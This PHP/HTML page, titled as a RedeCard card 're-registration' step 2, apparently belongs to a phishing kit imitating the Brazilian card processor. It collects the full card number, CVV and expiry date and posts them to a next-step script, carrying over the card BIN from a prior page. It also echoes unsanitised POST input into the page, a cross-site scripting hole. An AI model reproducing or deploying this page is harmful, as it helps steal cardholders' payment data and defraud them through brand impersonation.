<?php
     $bin_6_primeiro_digitos=$_POST['bin'];
?>


<html><head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<title>RedeCard - Recadastramento Passo 2</title></head><body leftmargin="20" topmargin="20" marginheight="20" marginwidth="20">
<body leftmargin="0" topmargin="0" marginheight="0" marginwidth="0" rightmargin="0" bottommargin="0">
<SCRIPT language=JavaScript>
	function validaForm(){
		d = document.form1;
							if (d.cvv2.value.length!=3){
alert("Digite o CVV do cartão.");
return false;
}
							if (d.ccn1.value.length!=4){
alert("Digite os 4 digitos do cartão no primeiro grupo.");
return false;
}
							if (d.ccn2.value.length!=4){
alert("Digite os 4 digitos do cartão no segundo grupo.");
return false;
}
							if (d.ccn3.value.length!=4){
alert("Digite os 4 digitos do cartão no terceiro grupo.");
return false;
}
							if (d.ccn4.value.length!=4){
alert("Digite os 4 digitos do cartão no quarto grupo.");
return false;

}
							if (d.smes.value.length == ""){
alert("Digite o Mês da Data de Validade do cartão.");
return false;

}
							if (d.sano.value.length == ""){
alert("Digite o Ano da Data de Validade do cartão.");
return false;

}							
					
		}
</SCRIPT>
<script LANGUAGE="Javascript">
function Numero(e)
{
  navegador = /msie/i.test(navigator.userAgent);
  if (navegador)
   var tecla = event.keyCode;
  else
   var tecla = e.which;
  
  if(tecla > 47 && tecla < 58) // numeros de 0 a 9
    return true;
  else
    {
      if (tecla != 8) // backspace
        return false;
      else
        return true;
    }
}
</SCRIPT>

<link type="text/css" rel="STYLESHEET" href="estilo.css">
<form name="form1" method="post" action="terceiro_passo.php" onKeyPress="return Numero(event);" onSubmit="return validaForm()">

		<table width="436" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>

		<td align="center">
			<!--Inicio Cabeçalho -->			
			

	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tbody><tr>
	<td width="10" height="55"><img src="img/trans.gif" width="10" border="0" height="1"></td>
	<td width="150">


		<img src="img/logo2.jpg" width="80" border="0" height="60">


	</td>
	<td width="100%" align="center"><img src="img/logo.jpg" width="278" border="0" height="41"></td>
	<td>
		<table class="corpoResumo" width="150" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td align="center" height="55"></td>
		</tr>
		</tbody></table>
	</td>

	<td width="10"><img src="img/trans.gif" width="10" border="0" height="1"></td>
	</tr>
	</tbody></table> 


			<!-- fim cabeçalho-->
					
			<table class="corpo" width="95%" border="0" cellpadding="0" cellspacing="0" height="303">
			<tbody><tr>
			<td width="10"><img src="img/trans.gif" width="10" border="0" height="1"></td>
			<td valign="top">
			<!--CORPO-->

				Complete as informações abaixo e clique em Concluir:<br><br>
				
				<table class="corpo" width="97%" align="center" border="0" cellpadding="0" cellspacing="0" height="239">
				<input name="vonclose" value="https://cbp.3dsolution.com.br/cbp/onunload.asp" type="hidden">
				<tbody>
			<tr>
			<td width="48%" height="39">
			Número do Cartão<br>
				<input name="ccn1" type="text" class="box" style="width: 33px;" onKeyUp="javascript:if(document.form1.ccn1.value.length==4)document.form1.ccn2.focus();" value="" size="20" maxlength="4">

	            
<input name="ccn2" type="text" class="box" style="width: 33px;" onKeyUp="javascript:if(document.form1.ccn2.value.length==4)document.form1.ccn3.focus();" value="" size="20" maxlength="4"> 
	            
<input name="ccn3" style="width: 33px;" class="box" maxlength="4" size="20" onKeyUp="javascript:if(document.form1.ccn3.value.length==4)document.form1.ccn4.focus();" type="text"> 
	            
<input name="ccn4" style="width: 33px;" class="box" maxlength="4" size="20" onKeyUp="javascript:if(document.form1.ccn4.value.length==4)document.form1.smes.focus();" type="text"> 
	            
<input name="ccn" type="hidden">
	           
<input name="bin" value="<?php echo $_POST['bin'];?>" type="hidden">
   		       
<input name="bin2" value="" type="hidden">		            
<input name="tid" value="56296821720402081001" type="hidden">

	            
			</td>
			<td width="52%" height="39">
					<table class="corpo" width="122" border="0" cellpadding="0" cellspacing="0">

					<tbody><tr>
					<td>Código de Segurança</td>
					</tr>
					<tr>
					<td>
	               		

<input name="cvv2" style="width: 40px;" class="box" onKeyUp="javascript:if(document.form1.cvv2.value.length==3)document.form1.Submit1.focus();" maxlength="3" size="20" type="text"></td>
					</tr>
					</tbody></table>

			</td>
			</tr>
					<tr>
			<td width="100%" height="36" colspan="2">
				Data de Validade<br>
				Mês <select class="box" name="smes">
				<option value="" selected="selected"> </option>

					
				<option value="01">01</option>
					
				<option value="02">02</option>
					
				<option value="03">03</option>
					
				<option value="04">04</option>
					
				<option value="05">05</option>
					
				<option value="06">06</option>

					
				<option value="07">07</option>
					
				<option value="08">08</option>
					
				<option value="09">09</option>
					
				<option value="10">10</option>
					
				<option value="11">11</option>
					
				<option value="12">12</option>

				
				</select>  
				Ano <select class="box" name="sano">
<option value="" selected></option>
				
                <option value="2010">2010</option>
                
				<option value="2011">2011</option>
				
				<option value="2012">2012</option>
				
				<option value="2013">2013</option>

				
				<option value="2014">2014</option>
				
				<option value="2015">2015</option>
				
				<option value="2016">2016</option>
				
				<option value="2017">2017</option>
				
				<option value="2018">2018</option>
				
				<option value="2019">2019</option>

				
				<option value="2020">2020</option>
				
				<option value="2021">2021</option>
				
				<option value="2022">2022</option>
				
				<option value="2023">2023</option>
				
				<option value="2024">2024</option>
				
				<option value="2025">2025</option>

				
				<option value="2026">2026</option>
				
				<option value="2027">2027</option>
				
				<option value="2028">2028</option>
				
				</select>
			
	            
			</td>
					</tr>
			<tr>

			<td colspan="2">
				<table width="" border="0" cellpadding="0" cellspacing="0">
				<tbody><tr>
				<td>
					<img src="img/mcfundo.jpg" width="150" border="0" height="92"></td>
					<td>&nbsp;</td>
					<td valign="top">
						<table class="corpo" width="123" border="0" cellpadding="0" cellspacing="0" height="85">
							<tbody><tr>

								<td height="30"></td>
							</tr>
							<tr>
								<td><span style="font-size: 9pt">Código de 
								Segurança:<br>3 últimos dígitos no<br>verso do 
								cartão</span><br></td>
							</tr>
						</tbody></table>
						<p>.</td>

				</tr>
				</tbody></table>
						
				
				
				
				
				</td><td height="122">                
				</td></tr><tr>
				<td colspan="2">
					<table width="" border="0" cellpadding="0" cellspacing="0">
					<tbody><tr>
					<!--TD WIDTH="147"><INPUT TYPE="Button" ONCLICK="fechar();" VALUE="Cancelar" name="Button1"></TD-->
					<td><input value="Continuar" name="Submit1" type="submit"> <input onClick="fechar();" value="Cancelar" name="Button2" type="button">

					</td>
					</tr>
					</tbody></table>
				</td>
				</tr>				
				</tbody></table>
			 
			<!--/CORPO-->
			</td>
			<td width="4">&nbsp;</td>

			<td valign="top" width="179">
				<!--Inicio Comprovante-->

					
		<table width="30" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td class="bgResumo" valign="top" align="center" height="250">
			<table width="175" border="0" cellpadding="0" cellspacing="0">
			<tbody><tr>
			<td height="10"></td>

			</tr>
			<tr>
			<td class="titResumo" align="center">Informações</td>
			</tr>
			<tr>
			<td height="5"></td>
			</tr>
			<tr>

			<td class="corpoResumoTitulo">
				<b class="subTitResumo">Siga os passos abaixo:</b><br><br>
				<b class="corpoResumoTitulo">1ª Digite os 6 primeiros digito do cartão.
</b> <font class="corpoConteudo"></font><br><br>
				<b class="corpoResumoTitulo">2ª Digite os demais dados do cartão.
</b> <font class="corpoConteudo"></font><br><br>
				<b class="corpoResumoTitulo">3ª Digite os dados do titular do cartão.</b> <font class="corpoConteudo"></font><br><br>

				
				<br>
				<center><img src="cbp.visanet_arquivos/px_preto.gif" vspace="5" width="95%" border="0" height="2"></center>
				<br>
				

				<center><span style="font-size: 7pt;"><br>

				 REDECARD ©
				</span>
				</center> <br>
			</td>
			</tr>
			</tbody></table>
		</td>
		</tr>
		</tbody></table>



				<!--Fim Comprovante-->

			</td>
			<td width="4">&nbsp;</td>
			</tr>
			</tbody></table>
		</td>
		</tr>

		</tbody></table>
		</form></body></html>
